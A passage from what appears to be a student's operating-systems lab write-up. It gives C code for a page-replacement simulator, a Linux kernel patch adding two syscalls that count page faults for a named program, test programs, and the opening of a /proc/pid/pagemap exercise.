class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_SIZE 2400                    <span class="comment">// Process virtual space size</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 10                       <span class="comment">// Page frame size</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_PAGES (ARRAY_SIZE / PAGE_SIZE) <span class="comment">// Number of pages in virtual memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_FRAMES 5                       <span class="comment">// Number of pages in physical memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_NUM_FRAMES 7                  <span class="comment">// Number of pages to jump</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOOP_TIMES 3                       <span class="comment">// Number of loop iterations</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main_array[ARRAY_SIZE];        <span class="comment">// Process virtual space</span></span><br><span class="line"><span class="type">int</span> frames[NUM_FRAMES][PAGE_SIZE]; <span class="comment">// Physical memory divided into page frames</span></span><br><span class="line"><span class="type">int</span> page_table[NUM_PAGES];         <span class="comment">// Page table entries (mapping from virtual page frame number to physical page frame number)</span></span><br><span class="line"><span class="type">int</span> frame_table[NUM_FRAMES];       <span class="comment">// Frame table (mapping from physical page frame number to virtual page frame number)</span></span><br><span class="line"><span class="type">int</span> page_faults = <span class="number">0</span>;               <span class="comment">// Number of page faults</span></span><br><span class="line"><span class="type">int</span> algo_choice = <span class="number">0</span>;               <span class="comment">// Page replacement algorithm</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> frame_pointer = <span class="number">0</span>;           <span class="comment">// For FIFO</span></span><br><span class="line"><span class="type">int</span> frame_queue[NUM_FRAMES];     <span class="comment">// For FIFO</span></span><br><span class="line"><span class="type">int</span> frame_timestamp[NUM_FRAMES]; <span class="comment">// For LRU</span></span><br><span class="line"><span class="type">int</span> future_pages[ARRAY_SIZE];    <span class="comment">// For OPT</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *algo_name[<span class="number">4</span>] = &#123;<span class="string">&quot;Random Replacement&quot;</span>, <span class="string">&quot;OPT&quot;</span>, <span class="string">&quot;FIFO&quot;</span>, <span class="string">&quot;LRU&quot;</span>&#125;; <span class="comment">// Page replacement algorithm names</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initialize</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="comment">// Fill random numbers and initialize</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        main_array[i] = rand() % <span class="number">100000</span>;</span><br><span class="line">        future_pages[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Initialize page table</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PAGES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        page_table[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Initialize page frame queue and timestamps</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        frame_queue[i] = <span class="number">-1</span>;</span><br><span class="line">        frame_timestamp[i] = <span class="number">-1</span>;</span><br><span class="line">        frame_table[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_opt</span><span class="params">(<span class="type">int</span> current_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Implement OPT algorithm</span></span><br><span class="line">    <span class="type">int</span> frame = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> max_future = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// Find the page frame that won&#x27;t be used for the longest time in the future</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// If an empty page frame is found, return directly</span></span><br><span class="line">        <span class="keyword">if</span> (frame_table[i] == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            frame = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="built_in">future</span> = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = current_time; j &lt; ARRAY_SIZE; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (future_pages[j] == frame_table[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">future</span> = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">future</span> &gt; max_future)</span><br><span class="line">        &#123;</span><br><span class="line">            max_future = <span class="built_in">future</span>;</span><br><span class="line">            frame = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (max_future == <span class="number">-1</span>)</span><br><span class="line">        frame = rand() % NUM_FRAMES;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_fifo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Implement FIFO algorithm, relying on queue, first in first out</span></span><br><span class="line">    <span class="type">int</span> frame = frame_pointer;</span><br><span class="line">    frame_pointer = (frame_pointer + <span class="number">1</span>) % NUM_FRAMES;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_frame_lru</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Implement LRU algorithm</span></span><br><span class="line">    <span class="type">int</span> lru = INT_MAX;</span><br><span class="line">    <span class="type">int</span> frame = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// Find the least recently used page frame</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FRAMES; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (frame_timestamp[i] &lt; lru)</span><br><span class="line">        &#123;</span><br><span class="line">            lru = frame_timestamp[i];</span><br><span class="line">            frame = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> frame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Access page</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">access_page</span><span class="params">(<span class="type">int</span> page_number, <span class="type">int</span> offset, <span class="type">int</span> current_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Page fault, use corresponding page replacement algorithm</span></span><br><span class="line">    <span class="keyword">if</span> (page_table[page_number] == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Find an empty or page frame that should be replaced</span></span><br><span class="line">        <span class="type">int</span> frame_number;</span><br><span class="line">        <span class="keyword">switch</span> (algo_choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            frame_number = find_frame_opt(current_time);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            frame_number = find_frame_fifo();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            frame_number = find_frame_lru();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            frame_number = rand() % NUM_FRAMES;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Change the previous virtual to physical page table mapping to -1</span></span><br><span class="line">        <span class="keyword">if</span> (frame_table[frame_number] != <span class="number">-1</span>)</span><br><span class="line">            page_table[frame_table[frame_number]] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31mPage Fault\033[0m, Page %3d loaded into frame %2d, data at offset %2d: &quot;</span>, page_number, frame_number, offset);</span><br><span class="line">        page_table[page_number] = frame_number;</span><br><span class="line">        frame_table[frame_number] = page_number;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            frames[frame_number][i] = main_array[page_number * PAGE_SIZE + i];</span><br><span class="line">        &#125;</span><br><span class="line">        page_faults++;</span><br><span class="line">        frame_queue[frame_number] = page_number;</span><br><span class="line">        frame_timestamp[frame_number] = current_time;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mPage Hit\033[0m, Page %3d in frame %2d, data at offset %2d: &quot;</span>, page_number, page_table[page_number], offset);</span><br><span class="line">        frame_timestamp[page_table[page_number]] = current_time;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%5d &quot;</span>, main_array[page_number * PAGE_SIZE + offset]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    initialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prompt user to select page replacement algorithm</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please select page replacement algorithm (1=OPT, 2=FIFO, 3=LRU), default random replacement: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;algo_choice);</span><br><span class="line">    <span class="keyword">if</span> (algo_choice &lt; <span class="number">1</span> || algo_choice &gt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid page replacement algorithm option, using default replacement method: random replacement.\n&quot;</span>);</span><br><span class="line">        algo_choice = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Currently using page replacement algorithm: %s\n&quot;</span>, algo_name[algo_choice]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prompt user to select page access order</span></span><br><span class="line">    <span class="type">int</span> access_order = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (algo_choice == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Prompt user to select, reselect if wrong choice</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">4</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Invalid access order option, please reselect.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OPT algorithm needs to know future page access order, please select page access order (1=sequential, 2=jump, 3=branch, 4=loop): &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;access_order);</span><br><span class="line">        &#125; <span class="keyword">while</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Prompt user to select, reselect if wrong choice</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">5</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Invalid access order option, please reselect.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Please select page access order (1=sequential, 2=jump, 3=branch, 4=loop, 5=random): &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;access_order);</span><br><span class="line">        &#125; <span class="keyword">while</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Access pages according to selected access order</span></span><br><span class="line">    <span class="keyword">switch</span> (access_order)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Sequential access</span></span><br><span class="line">        <span class="comment">// Construct future_pages array</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = i / PAGE_SIZE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            access_page(i / PAGE_SIZE, i % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// Jump access</span></span><br><span class="line">        <span class="comment">// Construct future_pages array</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE;</span><br><span class="line">        <span class="comment">// Access with JUMP_NUM_FRAMES step intervals</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            access_page(i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE, i * JUMP_NUM_FRAMES % ARRAY_SIZE % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// Branch access</span></span><br><span class="line">        <span class="comment">// Construct future_pages array</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Even page frames sequential access, odd page frames jump access</span></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                future_pages[i] = i / PAGE_SIZE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                future_pages[i] = i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                access_page(i / PAGE_SIZE, i % PAGE_SIZE, i);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                access_page(i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE, i * JUMP_NUM_FRAMES % ARRAY_SIZE % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// Loop access</span></span><br><span class="line">        <span class="comment">// Construct future_pages array</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = (i % (ARRAY_SIZE / LOOP_TIMES)) / PAGE_SIZE;</span><br><span class="line">        <span class="comment">// Loop access loop_times times</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++) </span><br><span class="line">            access_page((i % (ARRAY_SIZE / LOOP_TIMES)) / PAGE_SIZE, (i % (ARRAY_SIZE / LOOP_TIMES)) % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>: <span class="comment">// Random access</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> ind = rand() % ARRAY_SIZE;</span><br><span class="line">            access_page(ind / PAGE_SIZE, ind % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> ind = rand() % ARRAY_SIZE;</span><br><span class="line">            access_page(ind / PAGE_SIZE, ind % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Print future_pages */</span></span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; NUM_PAGES; i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     printf(&quot;%d &quot;, future_pages[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output page fault count</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Page access error count: %d, Hit rate: %.2f%%\n&quot;</span>, page_faults, (<span class="number">1</span> - (<span class="type">float</span>)page_faults / ARRAY_SIZE) * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="program-execution-results">Program Execution Results</h3><p>This is the original output example, but for better demonstration, Imade some modifications to the program and commented out someoutput.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-output.png"alt="Original output" /><figcaption aria-hidden="true">Original output</figcaption></figure><h4 id="opt">OPT</h4><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-opt.png"alt="OPT execution result" /><figcaption aria-hidden="true">OPT execution result</figcaption></figure><h4 id="fifo">FIFO</h4><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-fifo.png"alt="FIFO execution result" /><figcaption aria-hidden="true">FIFO execution result</figcaption></figure><h4 id="lru">LRU</h4><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-lru.png"alt="LRU execution result" /><figcaption aria-hidden="true">LRU execution result</figcaption></figure><p>Since the OPT algorithm needs to know the future page access order,after selecting the OPT algorithm, there is no option 5=randomaccess.</p><h2id="task-3-modify-linux-kernel-page-fault-handling-function-to-print-debug-information">Task3: Modify Linux Kernel Page Fault Handling Function to Print DebugInformation</h2><h3 id="task-requirements-2">Task Requirements</h3><ol type="1"><li><p>Write 2 applications similar to hello world or simple for loopsas test targets.</p></li><li><p>Add debug information using printk in Linux kernel’s page faulthandling function do_no_page() or similar functions (function names varyacross versions), print page fault information for specific processes(using program name as filter condition), and count pagefaults.</p></li><li><p>You can also add debug information using printk in Linux kernel’sphysical page frame allocation function get_free_page() or similarfunctions (function names vary across versions), print information aboutnew page frame allocation during specific process execution (usingprogram name as filter condition), and count relatedinformation.</p></li></ol><h3 id="modify-kernel-source-code">Modify Kernel Source Code</h3><h4 id="add-code-.mmmemory.c">Add Code <code>./mm/memory.c</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add two system calls for program control, one to set target program name, one to get target program&#x27;s page fault count</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> target_program[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// target program name</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_fault_count = <span class="number">0</span>;      <span class="comment">// page fault counts</span></span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(set_target_program_name, <span class="type">const</span> <span class="type">char</span> __user *, program_name) &#123;</span><br><span class="line">        <span class="comment">// copy name to kernel </span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(target_program,program_name, <span class="number">255</span>) != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;  <span class="comment">// if fail, return -EFAULT</span></span><br><span class="line"></span><br><span class="line">        target_program[<span class="number">255</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE0(get_page_fault_count) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;%s page fault count: %ld\n&quot;</span>, target_program, page_fault_count);</span><br><span class="line">        page_fault_count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> page_fault_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add debug information in do_no_page function</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(current-&gt;comm, target_program) == <span class="number">0</span>)</span><br><span class="line">                page_fault_count++;</span><br></pre></td></tr></table></figure><h4 id="system-call-function-declaration-.includelinuxsyscalls.h">SystemCall Function Declaration <code>./include/linux/syscalls.h</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add declarations for two system calls</span></span><br><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_set_target_program_name</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *name)</span>;</span><br><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_get_page_fault_count</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><h4 id="system-call-id-.archx86entrysyscallssyscall_64.tbl">System CallID <code>./arch/x86/entry/syscalls/syscall_64.tbl</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add system call numbers for two system calls</span></span><br><span class="line"><span class="number">448</span>   <span class="number">64</span>   set_target_program_name     sys_set_target_program_name</span><br><span class="line"><span class="number">449</span>   <span class="number">64</span>   get_page_fault_count        sys_get_page_fault_count</span><br></pre></td></tr></table></figure><h4id="system-call-id-declaration-.includeuapiasm-genericunistd.h">SystemCall ID Declaration<code>./include/uapi/asm-generic/unistd.h</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add declarations for two system calls</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_target_program_name 448</span></span><br><span class="line">__SYSCALL(__NR_set_target_program_name, sys_set_target_program_name)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_page_fault_count 449</span></span><br><span class="line">__SYSCALL(__NR_get_page_fault_count, sys_get_page_fault_count)</span><br></pre></td></tr></table></figure><h3 id="write-test-code-after-kernel-compilation">Write Test Code AfterKernel Compilation</h3><p>The compilation will report an error as follows:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-3-error1.png"alt="Error" /><figcaption aria-hidden="true">Error</figcaption></figure><p>Initially I didn’t know what this error meant, and after modifyingfor a long time without effect, I later added<code>#include &lt;linux/syscalls.h&gt;</code> and it worked. This meansthat if you define system calls, you must include this header file. Butthe error message is not very clear, which caused me to waste a lot oftime.</p><p>Below is test1.c, test2.c just removes the newly added system calls.This is to test that the debug information is controllable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Assume these are the numbers for your new system calls</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_SET_TARGET_PROGRAM_NAME 448</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_GET_PAGE_FAULT_COUNT 449</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> size = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Set target program name</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *target_program = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    syscall(SYS_SET_TARGET_PROGRAM_NAME, target_program);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute operations that may trigger page faults</span></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">            <span class="built_in">array</span>[i][j] = i + j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get and output page fault count</span></span><br><span class="line">    syscall(SYS_GET_PAGE_FAULT_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="program-execution-results-1">Program Execution Results</h3><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-3-test_result.png"alt="Program execution result" /><figcaption aria-hidden="true">Program execution result</figcaption></figure><p>As shown in the figure, only the page fault count for the test1program was printed, while the page fault count for the test2 programwas not printed.</p><h2id="task-4-calculate-va-to-pa-mapping-using-procpidpagemap-in-linux">Task4: Calculate VA to PA Mapping using /proc/pid/pagemap in Linux</h2><h3 id="task-requirements-3">Task Requirements</h3><ol type="1"><li><p>Linux’s /proc/pid/pagemap file allows users to view physicaladdresses and other related information of current process virtualpages. Each virtual page contains a 64-bit value, pay attention toanalyzing the 64-bit information.</p></li><li><p>Get the full name of the current process’s pagemap file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Example code from ppt</span></span><br><span class="line"><span class="type">pid_t</span> pid = getpid();</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d&quot;</span>, pid);</span><br><span class="line"><span class="built_in">strcpy</span>(filename, <span 